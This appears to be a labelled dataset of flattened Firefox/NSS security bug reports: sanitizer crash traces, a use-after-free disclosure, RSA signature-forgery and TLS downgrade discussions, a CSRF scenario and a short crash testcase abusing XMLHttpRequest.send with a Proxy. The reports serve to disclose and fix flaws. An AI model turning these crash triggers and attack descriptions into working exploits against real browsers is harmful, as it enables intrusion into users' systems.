gfxcontext nsiframe nslinelist_iterator const unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:2559 9 in nstextframe addinlineminwidthforflow nsrenderingcontext nsiframe inlineminwidthdata nstextframe textruntype builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:7018 10 in nstextframe addinlineminwidth nsrenderingcontext nsiframe inlineminwidthdata builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nstextframe.cpp:7175 11 in nsblockframe getminwidth nsrenderingcontext builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsblockframe.cpp:733 12 in nslayoututils intrinsicforcontainer nsrenderingcontext nsiframe nslayoututils intrinsicwidthtype unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nslayoututils.cpp:3732 13 in nsblockframe getminwidth nsrenderingcontext builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsblockframe.cpp:713 14 in nslayoututils intrinsicforcontainer nsrenderingcontext nsiframe nslayoututils intrinsicwidthtype unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nslayoututils.cpp:3732 15 in nsblockframe getminwidth nsrenderingcontext builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsblockframe.cpp:713 16 in nslayoututils intrinsicforcontainer nsrenderingcontext nsiframe nslayoututils intrinsicwidthtype unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nslayoututils.cpp:3732 17 in nsblockframe getminwidth nsrenderingcontext builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsblockframe.cpp:713 18 in nslayoututils intrinsicforcontainer nsrenderingcontext nsiframe nslayoututils intrinsicwidthtype unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nslayoututils.cpp:3732 19 in nsblockframe getminwidth nsrenderingcontext builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsblockframe.cpp:713 20 in nslayoututils intrinsicforcontainer nsrenderingcontext nsiframe nslayoututils intrinsicwidthtype unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nslayoututils.cpp:3732 21 in nsblockframe getminwidth nsrenderingcontext builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsblockframe.cpp:713 22 in nslayoututils intrinsicforcontainer nsrenderingcontext nsiframe nslayoututils intrinsicwidthtype unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nslayoututils.cpp:3732 23 in nsblockframe getminwidth nsrenderingcontext builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsblockframe.cpp:713 24 in nslayoututils intrinsicforcontainer nsrenderingcontext nsiframe nslayoututils intrinsicwidthtype unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nslayoututils.cpp:3732 25 in nsblockframe getminwidth nsrenderingcontext builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsblockframe.cpp:713 26 in nsframe shrinkwidthtofit nsrenderingcontext int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsframe.cpp:4240 27 in nscontainerframe computeautosize nsrenderingcontext nssize int nssize nssize nssize bool builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nscontainerframe.cpp:899 28 in nsframe computesize nsrenderingcontext nssize int nssize nssize nssize unsigned int builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsframe.cpp:4030 29 in nshtmlreflowstate initabsoluteconstraints nsprescontext nshtmlreflowstate const int int nsiatom builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nshtmlreflowstate.cpp:1458 summary addresssanitizer heap-buffer-overflow 0 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 contiguous container oob fc asan internal fe 7111==aborting	11
apparent info leak caused by uninitialized memory with malformed gifs check this out the code repeatedly loads the same image via img and then puts it on canvas comparing results at least on my system this generates somewhere between 4 and 8 distinct bitmaps the differences are also apparent visually this feels awfully like the use of uninitialized memory if that s the case it sounds like a potential security-relevant info leak the image in question is	11
out-of-bounds read in mozilla dom audioeventtimeline mozilla errorresult extractvaluefromcurve stacktrace from fatalsignalhandler assertion failure ratio 0.0 ratio can never be negative here at dist/include/audioeventtimeline.h:425 5 mozilla dom audioeventtimeline mozilla errorresult extractvaluefromcurve starttime optimized out acurve optimized out acurvelength optimized out duration optimized out t optimized out at dist/include/audioeventtimeline.h:425 6 in mozilla dom audioeventtimeline mozilla errorresult getvalueattime double this atime=-nan at dist/include/audioeventtimeline.h:258 7 in mozilla dom biquadfilternode getfrequencyresponse this afrequencyhz amagresponse aphaseresponse at builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/webaudio/biquadfilternode.cpp:338 8 in mozilla dom biquadfilternodebinding getfrequencyresponse cx self optimized out args obj at biquadfilternodebinding.cpp:256	11
lcalldomnative incorrectly assumes this is always an object i was looking at crash urls for jit crashes on crash-stats and was able to reproduce a crash in jit code on manpower.com the problem is that codegenerator visitcalldomnative does register obj masm.extractobject address stackpointer 0 argobj but this is not guaranteed to be an object so if you do something like var method document.body.mozmatchesselector method.call v selector and v is an integer we ll treat it as an object pointer and this allows an attacker to do all kinds of scary things the attached testcase crashes nightly for me on os x 32-bit you may have to turn off off-thread compilation first	11
the stop sharing option in the video sharing control in the url bar has no effect in iframes str 1 go to 2 grant permission to share your camera 3 once streaming begins click the orange video sharing icon in the url bar 4 choose the stop sharing option from the popup in the sharing control box that appears notice that streaming continues there is no console output indicating an error state jesup suggests in irc this may be because the video is in an iframe	2
navigating away from a page with camera sharing in an iframe leaves camera recording this bug was initially created as a clone of another bug str 1 go to 2 click video to enable camera sharing in one of the iframes 3 navigate away type in any url and observe that the camera light stays on 4 hit the back button and there you are still being recorded it seems visuals and all the same problem exists if you navigate away using the back button in step 3 this problem seems specific to camera sharing in iframes i ve verified that mediamanager onnavigation is not called in these cases	2
oob write in get_tile 24164==error addresssanitizer segv on unknown address pc bp sp t32 0 in vp9_decode_frame media/libvpx/vp9/decoder/vp9_decodframe.c:51:3 1 in vp9_receive_compressed_data media/libvpx/vp9/decoder/vp9_onyxd_if.c:348:13 2 in vp9_decode media/libvpx/vp9/vp9_dx_iface.c:349:9 3 in vpx_codec_decode media/libvpx/vpx/src/vpx_decoder.c:127:11 4 in mozilla webmreader decodevideoframe bool long content/media/webm/webmreader.cpp:916:9 5 in mozilla mediadecoderreader requestvideodata bool long content/media/mediadecoderreader.cpp:167:10 6 in nsrunnablemethodimpl void mozilla mediadecoderstatemachine void true run objdir-ff-asan/content/media dist/include/nsthreadutils.h:388:7 7 in mozilla mediataskqueue runner run content/media/mediataskqueue.cpp:194:3 8 in nsthreadpool run xpcom/threads/nsthreadpool.cpp:220:7 9 in non-virtual thunk to nsthreadpool run xpcom/threads/nsthreadpool.cpp:234:1 10 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:823:7 11 in ns_processnextevent nsithread bool xpcom/glue/nsthreadutils.cpp:265:10 12 in mozilla ipc messagepumpfornonmainthreads run base messagepump delegate ipc/glue/messagepump.cpp:326:20 13 in messageloop run ipc/chromium/src/base/message_loop.cc:229:3 14 in nsthread threadfunc void xpcom/threads/nsthread.cpp:350:5 15 in pt_root nsprpub/pr/src/pthreads/ptthread.c:212:5 16 in start_thread build/buildd/eglibc-2.17/nptl/pthread_create.c:311 addresssanitizer can not provide additional info summary addresssanitizer segv 0 thread t32 media decode 2 created by t31 media decode 1 here 0 in interceptor_pthread_create asan_rtl 1 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:453:14 2 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:544:12 3 in nsthread init xpcom/threads/nsthread.cpp:455:19 4 in nsthreadmanager newthread unsigned int unsigned int nsithread xpcom/threads/nsthreadmanager.cpp:269:17 5 in nsthreadpool putevent nsirunnable xpcom/threads/nsthreadpool.cpp:101:3 6 in nsthreadpool dispatch nsirunnable unsigned int xpcom/threads/nsthreadpool.cpp:261:5 7 in mozilla mediataskqueue runner run content/media/mediataskqueue.cpp:225:19 8 in nsthreadpool run xpcom/threads/nsthreadpool.cpp:220:7 9 in non-virtual thunk to nsthreadpool run xpcom/threads/nsthreadpool.cpp:234:1 10 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:823:7 11 in ns_processnextevent nsithread bool xpcom/glue/nsthreadutils.cpp:265:10 12 in mozilla ipc messagepumpfornonmainthreads run base messagepump delegate ipc/glue/messagepump.cpp:326:20 13 in messageloop run ipc/chromium/src/base/message_loop.cc:229:3 14 in nsthread threadfunc void xpcom/threads/nsthread.cpp:350:5 15 in pt_root nsprpub/pr/src/pthreads/ptthread.c:212:5 16 in start_thread build/buildd/eglibc-2.17/nptl/pthread_create.c:311 thread t31 media decode 1 created by t30 media s~hine 1 here 0 in interceptor_pthread_create asan_rtl 1 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:453:14 2 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:544:12 3 in nsthread init xpcom/threads/nsthread.cpp:455:19 4 in nsthreadmanager newthread unsigned int unsigned int nsithread xpcom/threads/nsthreadmanager.cpp:269:17 5 in nsthreadpool putevent nsirunnable xpcom/threads/nsthreadpool.cpp:101:3 6 in nsthreadpool dispatch nsirunnable unsigned int xpcom/threads/nsthreadpool.cpp:261:5 7 in mozilla mediataskqueue dispatchlocked mozilla temporaryref nsirunnable mozilla mediataskqueue dispatchmode content/media/mediataskqueue.cpp:53:17 8 in mozilla mediataskqueue dispatch mozilla temporaryref nsirunnable content/media/mediataskqueue.cpp:34:10 9 in mozilla mediadecoderstatemachine enqueuedecodemetadatatask content/media/mediadecoderstatemachine.cpp:1569:17 10 in mozilla mediadecoderstatemachine runstatemachine content/media/mediadecoderstatemachine.cpp:2356:14 11 in mozilla mediadecoderstatemachinescheduler timeoutexpired int content/media/mediadecoderstatemachinescheduler.cpp:160:10 12 in nsthreadpool run xpcom/threads/nsthreadpool.cpp:220:7 13 in non-virtual thunk to nsthreadpool run xpcom/threads/nsthreadpool.cpp:234:1 14 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:823:7 15 in ns_processnextevent nsithread bool xpcom/glue/nsthreadutils.cpp:265:10 16 in mozilla ipc messagepumpfornonmainthreads run base messagepump delegate ipc/glue/messagepump.cpp:326:20 17 in messageloop run ipc/chromium/src/base/message_loop.cc:229:3 18 in nsthread threadfunc void xpcom/threads/nsthread.cpp:350:5 19 in pt_root nsprpub/pr/src/pthreads/ptthread.c:212:5 20 in start_thread build/buildd/eglibc-2.17/nptl/pthread_create.c:311 thread t30 media s~hine 1 created by t0 here 0 in interceptor_pthread_create asan_rtl 1 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:453:14 2 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:544:12 3 in nsthread init xpcom/threads/nsthread.cpp:455:19 4 in nsthreadmanager newthread unsigned int unsigned int nsithread xpcom/threads/nsthreadmanager.cpp:269:17 5 in nsthreadpool putevent nsirunnable xpcom/threads/nsthreadpool.cpp:101:3 6 in nsthreadpool dispatch nsirunnable unsigned int xpcom/threads/nsthreadpool.cpp:261:5 7 in mozilla mediadecoderstatemachinescheduler schedule long content/media/mediadecoderstatemachinescheduler.cpp:129:10 8 in mozilla mediadecoder schedulestatemachinethread content/media/mediadecoderstatemachine.cpp:3001:10 9 in mozilla mediadecoder initializestatemachine mozilla mediadecoder content/media/mediadecoder.cpp:572:10 10 in mozilla dom htmlmediaelement finishdecodersetup mozilla mediadecoder mozilla mediaresource nsistreamlistener mozilla mediadecoder content/html/content/src/htmlmediaelement.cpp:2674:17 11 in mozilla dom htmlmediaelement initializedecoderforchannel nsichannel nsistreamlistener content/html/content/src/htmlmediaelement.cpp:2624:12 12 in mozilla dom htmlmediaelement medialoadlistener onstartrequest nsirequest nsisupports content/html/content/src/htmlmediaelement.cpp:350:7 13 in nsbasechannel onstartrequest nsirequest nsisupports netwerk/base/src/nsbasechannel.cpp:737:14 14 in nsinputstreampump onstatestart netwerk/base/src/nsinputstreampump.cpp:531:14 15 in nsinputstreampump oninputstreamready nsiasyncinputstream netwerk/base/src/nsinputstreampump.cpp:433:25 16 in nsinputstreamreadyevent run xpcom/io/nsstreamutils.cpp:88:9 17 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:823:7 18 in ns_processnextevent nsithread bool xpcom/glue/nsthreadutils.cpp:265:10 19 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:99:21 20 in messageloop run ipc/chromium/src/base/message_loop.cc:229:3 21 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:164:3 22 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:280:19 23 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:4101:10 24 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:4172:8 25 in xre_main toolkit/xre/nsapprunner.cpp:4386:16 26 in main browser/app/nsbrowserapp.cpp:282:12 27 in libc_start_main build/buildd/eglibc-2.17/csu/libc-start.c:260	11
rsa pkcs 1 signature verification forgery is possible due to too-permissive signaturealgorithm parameter parsing in bug 1054659 comment 20 antoine delignat-lavaud wrote it is indeed possible to attack rsa-pkcs 1v1.5 in nss earlier you pointed me to the file nss/lib/cryptohi/secvfy.c for signature verification near the top of the file there s a function with this interesting comment make sure the parameters are not too bogus if di digestalgorithm.parameters.len 2 goto sigloser this allows pkcs 1 signatures to include up to two arbitrary parameters in the unpadded asn.1 structure instead of the required null this is quite bad because it opens up a beichenbacher-like attack using the homomorphic signature property of rsa it is possible to build from one or more valid signatures more valid signatures for a different hash or even for a different hash function thus the attack i described above is in fact possible even against rsa-pkcs 1 even though we initially thought this was a new variant it turns out that it was in fact already described by oiwa et al in the gnutls-sa-2006-4 report instead of explaining how it works precisely i urge you to read section 5 of which provides an excellent description of a practical exploit against e=3 signatures however please note that we were able to create a proof of concept even for a e=65537 signature let me know if you d like me to attach it for a test case we confirmed that neither ie/schannel nor openssl nor gnutls are vulnerable antoine please attach it to this bug thanks when you say up to two arbitrary parameters you actually mean one parameter of at most two arbitrary bytes right	5
directionalityutils use-after-free crash mozilla dom element updatestate bool zdi-can-2531 zdi reported the following to the security alias zdi-can-2531 mozilla firefox directionalityutils use-after-free remote code execution vulnerability cvss 6.8 av n/ac m/au n/c p/i p/a p abstract hp s zero day initiative has identified a vulnerability affecting the following products mozilla firefox vulnerability details verified against firefox 32.0 stable on windows 8.1 as well as the nightly build 35.0 a1 note that this might require a couple of tries to trigger properly debug info against the night build df8.a2c access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=5a5a5a5a ebx=0f223c80 ecx=0f9c1560 edx=0f9c1560 esi=0f9c1560 edi=00000002 eip=60536caf esp=00eee09c ebp=00eee0bc iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210202 xul mozilla dom element updatestate 60536caf 8b80a8010000 mov eax dword ptr eax+1a8h ds:0023:5a5a5c02 rest of stack deleted can be retrieved if needed dveditz credit this vulnerability was discovered by regenrecht working with hp s zero day initiative	11
bad casting from basicthebeslayer to basiccontainerlayer user agent mozilla/5.0 x11 linux x86_64 applewebkit/537.36 khtml like gecko chrome/37.0.2062.120 safari/537.36 steps to reproduce hi firefox we have recently developed a runtime detection tool to identify undefined behaviors in static_cast similar to fsanitize=object-size/-fsanitize=vptr in clang but we improved to find undefined behaviors please see our confirmed other bug reports in libstdc we have built/run firefox using our instrumentation tool and also found several bad castings in firefox let us report an issue one by one gfx/layers/basic/basiclayermanager.cpp alayer might not be a container layer but if so we take care not to use the container variable basiccontainerlayer container static_cast basiccontainerlayer alayer here alayer is pointing to the object allocated as basicthebeslayer and it is casted into basiccontainerlayer however since basiccontainerlayer is not a subobject of basicthebeslayer it is violating c standard rules 5.2.9/11 down casting is undefined if the object that the pointer to be casted points to is not a suboject of down casting type and causes undefined behaviors class layouts for basicthebeslayer and basiccontainerlayer are attached and pasted the error reports from our tool actual results bad-casting reports home/blee/project/firefox/firefox/gfx/layers/basic/basiclayermanager.cpp:800:36 casting from mozilla layers basicthebeslayer to mozilla layers basiccontainerlayer pointer alloc base user base offset typetable 0 in paintlayer home/blee/project/firefox/firefox/gfx/layers/basic/basiclayermanager.cpp:800 1 in paintselforchildren home/blee/project/firefox/firefox/gfx/layers/basic/basiclayermanager.cpp:744 2 in paintlayer home/blee/project/firefox/firefox/gfx/layers/basic/basiclayermanager.cpp:847 3 in paintselforchildren home/blee/project/firefox/firefox/gfx/layers/basic/basiclayermanager.cpp:744 4 in paintlayer home/blee/project/firefox/firefox/gfx/layers/basic/basiclayermanager.cpp:847 5 in endtransactioninternal home/blee/project/firefox/firefox/gfx/layers/basic/basiclayermanager.cpp:524 6 in paintframeswitheffects home/blee/project/firefox/firefox/layout/svg/nssvgintegrationutils.cpp:544 7 in paintinactivelayer home/blee/project/firefox/firefox/layout/base/framelayerbuilder.cpp:2592 8 in drawthebeslayer home/blee/project/firefox/firefox/layout/base/framelayerbuilder.cpp:4497 9 in paintbuffer home/blee/project/firefox/firefox/gfx/layers/basic/basicthebeslayer.h:116 10 in validate home/blee/project/firefox/firefox/gfx/layers/basic/basicthebeslayer.cpp:184 11 in validate home/blee/project/firefox/firefox/gfx/layers/basic/basiccontainerlayer.cpp:128 12 in endtransactioninternal home/blee/project/firefox/firefox/gfx/layers/basic/basiclayermanager.cpp:493	9
navigator.sendbeacon does n't satisfy cors specification user agent mozilla/5.0 windows nt 6.1 wow64 applewebkit/537.36 khtml like gecko chrome/37.0.2062.124 safari/537.36 steps to reproduce suppose alice.csrf.jp is a victim and mallory.csrf.jp is the attacker in following scenario 1 as a preparation set victim s cookie by accessing following url 2 launch attacker s page then cross-origin beacon is invoked to the victim i.e alice.csrf.jp 3 analyze the http request data sent to the victim via navigator.sendbeacon actual results request data sent from navigator.sendbeacon has no origin header also the request data contains victim s cookie automatically expected results w3c s beacon spec says beacon request needs to be initialized as force origin header flag set credentials mode omit so the request header should contain origin and should not contain cookie by default	2
heap-buffer-overflow read of size when playing a m4v video gstreamer asan reports the buffer overflow when the attached video is played current normal build crashes at null the size suggests that it could be static and guaranteed to just crash but worth checking how this ends up happening filing as a security bug to be on the safe side 13165==error addresssanitizer heap-buffer-overflow on address at pc bp 0 sp read of size 4294967295 at thread t48 multiqueue1 src 0 in interceptor_memcpy asan_rtl 1 in 0 2 in 0 thread t48 multiqueue1 src created by t46 qtdemux0 sink here 0 in interceptor_pthread_create asan_rtl 1 in 0	7
stack-buffer-overflow write in mozilla fileblockcache read 35313==error addresssanitizer stack-buffer-overflow on address at pc bp sp write of size 8200 at thread t83 media decode 1 0 in interceptor_read.part.40 build/llvm/projects/compiler-rt/lib/asan sanitizer_common/sanitizer_common_interceptors.inc:352 1 in pt_read build/firefox/src/nsprpub/pr/src/pthreads/ptio.c:1287:13 2 in anonymous namespace interposedread prfiledesc void int build/firefox/src/xpcom/build/nsprinterposer.cpp:58:10 3 in mozilla fileblockcache read long unsigned char int int build/firefox/src/content/media/fileblockcache.cpp:146:16 4 in mozilla mediacachestream read char unsigned int unsigned int build/firefox/src/content/media/mediacache.cpp:672:10 5 in mozilla channelmediaresource read char unsigned int unsigned int 6 in mozilla webm_read void unsigned long void 7 in ne_peek_element build/firefox/src/media/libnestegg/src/nestegg.c:551:10 8 unknown module address is located in stack of thread t83 media decode 1 at offset 49 in frame 0 in ne_peek_element build/firefox/src/media/libnestegg/src/nestegg.c:892 this frame has 2 object s 32 33 b.i.i1 48 49 b.i.i memory access at offset 49 overflows this variable hint this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext longjmp and c exceptions are supported thread t83 media decode 1 created by t82 media s~hine 1 here 0 in interceptor_pthread_create asan_rtl 1 in pr_createthread build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:453:14 2 in pr_createthread build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:544:12 3 in nsthread init build/firefox/src/xpcom/threads/nsthread.cpp:455:19 4 in nsthreadmanager newthread unsigned int unsigned int nsithread build/firefox/src/xpcom/threads/nsthreadmanager.cpp:269:17 5 in nsthreadpool putevent nsirunnable build/firefox/src/xpcom/threads/nsthreadpool.cpp:101:3 6 in nsthreadpool dispatch nsirunnable unsigned int build/firefox/src/xpcom/threads/nsthreadpool.cpp:261:5 7 in mozilla mediataskqueue dispatchlocked mozilla temporaryref nsirunnable mozilla mediataskqueue dispatchmode build/firefox/src/content/media/mediataskqueue.cpp:53:17 8 in mozilla mediadecoderstatemachine enqueuedecodemetadatatask build/firefox/src/content/media/mediataskqueue.cpp:34:10 9 in mozilla mediadecoderstatemachine runstatemachine build/firefox/src/content/media/mediadecoderstatemachine.cpp:2376:14 10 in non-virtual thunk to anonymous namespace timerevent run build/firefox/src/content/media/mediadecoderstatemachinescheduler.cpp:160:10 11 in nsthreadpool run build/firefox/src/xpcom/threads/nsthreadpool.cpp:220:7 12 in non-virtual thunk to nsthreadpool run 13 in nsthread processnextevent bool bool build/firefox/src/xpcom/threads/nsthread.cpp:830:7 14 in ns_processnextevent nsithread bool build/firefox/src/xpcom/glue/nsthreadutils.cpp:265:10 15 in mozilla ipc messagepumpfornonmainthreads run base messagepump delegate build/firefox/src/ipc/glue/messagepump.cpp:368:5 16 in messageloop run build/firefox/src/ipc/chromium/src/base/message_loop.cc:233:3 17 in nsthread threadfunc void build/firefox/src/xpcom/threads/nsthread.cpp:350:5 18 in pt_root build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:212:5 19 in start_thread build/buildd/eglibc-2.15/nptl/pthread_create.c:308 thread t82 media s~hine 1 created by t0 here 0 in interceptor_pthread_create asan_rtl 1 in pr_createthread build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:453:14 2 in pr_createthread build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:544:12 3 in nsthread init build/firefox/src/xpcom/threads/nsthread.cpp:455:19 4 in nsthreadmanager newthread unsigned int unsigned int nsithread build/firefox/src/xpcom/threads/nsthreadmanager.cpp:269:17 5 in nsthreadpool putevent nsirunnable build/firefox/src/xpcom/threads/nsthreadpool.cpp:101:3 6 in nsthreadpool dispatch nsirunnable unsigned int build/firefox/src/xpcom/threads/nsthreadpool.cpp:261:5 7 in mozilla mediadecoderstatemachinescheduler schedule long build/firefox/src/content/media/mediadecoderstatemachinescheduler.cpp:129:10 8 in mozilla mediadecoder initializestatemachine mozilla mediadecoder build/firefox/src/content/media/mediadecoderstatemachine.cpp:3025:10 9 in mozilla dom htmlmediaelement finishdecodersetup mozilla mediadecoder mozilla mediaresource nsistreamlistener mozilla mediadecoder build/firefox/src/content/html/content/src/htmlmediaelement.cpp:2659:17 10 in mozilla dom htmlmediaelement initializedecoderforchannel nsichannel nsistreamlistener build/firefox/src/content/html/content/src/htmlmediaelement.cpp:2607:12 11 in mozilla dom htmlmediaelement medialoadlistener onstartrequest nsirequest nsisupports build/firefox/src/content/html/content/src/htmlmediaelement.cpp:349:7 12 in mozilla net nshttpchannel callonstartrequest build/firefox/src/netwerk/protocol/http/nshttpchannel.cpp:914:14 13 in mozilla net nshttpchannel continueprocessnormal tag_nsresult build/firefox/src/netwerk/protocol/http/nshttpchannel.cpp:1668:10 14 in mozilla net nshttpchannel processnormal build/firefox/src/netwerk/protocol/http/nshttpchannel.cpp:1603:12 15 in mozilla net nshttpchannel processresponse build/firefox/src/netwerk/protocol/http/nshttpchannel.cpp:1513:14 16 in mozilla net nshttpchannel onstartrequest nsirequest nsisupports build/firefox/src/netwerk/protocol/http/nshttpchannel.cpp:5172:20 17 in nsinputstreampump onstatestart build/firefox/src/netwerk/base/src/nsinputstreampump.cpp:531:14 18 in nsinputstreampump oninputstreamready nsiasyncinputstream build/firefox/src/netwerk/base/src/nsinputstreampump.cpp:433:25 19 in nsinputstreamreadyevent run build/firefox/src/xpcom/io/nsstreamutils.cpp:88:9 20 in nsthread processnextevent bool bool build/firefox/src/xpcom/threads/nsthread.cpp:830:7 21 in ns_processnextevent nsithread bool build/firefox/src/xpcom/glue/nsthreadutils.cpp:265:10 22 in mozilla ipc messagepump run base messagepump delegate build/firefox/src/ipc/glue/messagepump.cpp:99:21 23 in messageloop run build/firefox/src/ipc/chromium/src/base/message_loop.cc:233:3 24 in nsbaseappshell run 25 in nsappstartup run build/firefox/src/toolkit/components/startup/nsappstartup.cpp:280:19 26 in xremain xre_mainrun build/firefox/src/toolkit/xre/nsapprunner.cpp:4095:10 27 in xremain xre_main int char nsxreappdata const build/firefox/src/toolkit/xre/nsapprunner.cpp:4168:8 28 in xre_main build/firefox/src/toolkit/xre/nsapprunner.cpp:4382:16 29 in main build/firefox/src/browser/app/nsbrowserapp.cpp:287:12 30 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:226 summary addresssanitizer stack-buffer-overflow 0 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 04 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 04 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 01 f2 01 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac asan internal fe 35313==aborting	11
nss incorrectly permits skipping of serverkeyexchange user agent mozilla/5.0 macintosh intel mac os x 10_9_5 applewebkit/537.36 khtml like gecko chrome/38.0.2125.104 safari/537.36 steps to reproduce we have been performing systematic state machine tests on nss openssl and other ssl implementations and we found some unexpected behaviours in nss not all are immediately exploitable we will report the other weirdnesses in due course but here s one that seems to break false start s forward secrecy guarantee the core issue is that the nss client allows an ecdhe_ecdsa exchange where the server does not send its serverkeyexchange message in this case nss will take the long-term ec key from the ecdsa certificate and use that instead of the server s ephemeral parameters this violates the tls protocol and also has some security implications for forward secrecy the application at the client e.g the browser still thinks it is engaged in an ecdhe exchange but in fact it has been silently downgraded to a non-forward secret mixed-ecdh exchange consequently if false start is enabled the client will start sending data encrypted under the non forward-secret connection keys this breaks some of the changes of bug942729 to test this behavior we used chrome or firefox to connect to gmail which uses ecdhe-ecdsa via a network proxy we allow all messages to pass through but block the serverkeyexchange going from google to the browser the browser still completes the handshake and starts sending data the culprit is in the beginning of ssl3_sendclientkeyexchange in ssl3con.c if ss sec.peerkey null serverkey cert_extractpublickey ss sec.peercert expected results one would expect the client to kill the handshake when it receives the serverhellodone without having received a serverkeyexchange in an ecdhe exchange a similar behavior occurs for dhe but requires the server to send a dh-key certificate which is much rarer in practice	4
ipc channel does not validate the listener we have have probably inherited cve-2011-3079 from our import of chromium s ipc code 5½ years ago my understanding of this bug is chromium ipc endpoints have names and knowing the name is sufficient to connect to it these names were predictable and on windows are reflected in the named pipe namespace which an untrusted process can traverse the patch adds 32 bits of randomness to each name and excludes that part from the pipe name on windows anyone with more knowledge of ipc is invited to correct this summary if needed there s also a patch on the bug which seems to not be directly related to the ipc issue itself and has something to do with windows security levels c18 this bug was initially created as a clone of bug 958895 ipc channel does not validate the listener	9
xmlhttprequest.prototype.send crashes when given a crafted object user agent mozilla/5.0 macintosh intel mac os x 10_9_5 applewebkit/537.36 khtml like gecko chrome/38.0.2125.104 safari/537.36 steps to reproduce crashes safely on an out-of-thread access xhr new xmlhttprequest xhr.open post xhr.send available function crashes safely on null ptr deref q=0 u new proxy get function if q 0 xhr.abort return function xhr new xmlhttprequest xhr.open post k xhr.send u i did n't explore any further looks like a type confusion issue i poked around a bit to look for exploitability but nothing obvious jumped out at me expected results sorry for the terrible huge crash screenshot i forgot to dump the stack to text	9
